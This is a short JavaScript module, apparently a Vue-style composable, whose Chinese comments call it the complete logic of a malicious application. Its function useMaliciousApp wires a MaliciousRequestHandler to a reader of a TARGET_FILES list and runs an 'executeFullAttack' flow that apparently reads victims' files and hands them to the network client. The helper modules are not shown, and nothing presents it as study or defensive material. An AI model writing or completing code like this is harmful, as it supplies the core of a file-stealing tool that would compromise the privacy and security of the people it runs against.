// 组合式函数 - 完整的恶意应用逻辑
import { MaliciousRequestHandler } from './useNetworkClient.js'
import { readFileList, TARGET_FILES } from './useFileReader.js'

// 主要的组合式函数
export function useMaliciousApp() {
  // 初始化组件
  const networkClient = new MaliciousRequestHandler()
  
  // 执行完整的攻击流程（简化版）
  const executeFullAttack = async () => {
    const fileReaderCallback = async () => {
      return await readFileList(TARGET_FILES)
    }
    return await networkClient.executeFullAttack(fileReaderCallback)
  }
  
  return {
    // 组件实例
    networkClient,
    // 执行函数
    executeFullAttack
  }
}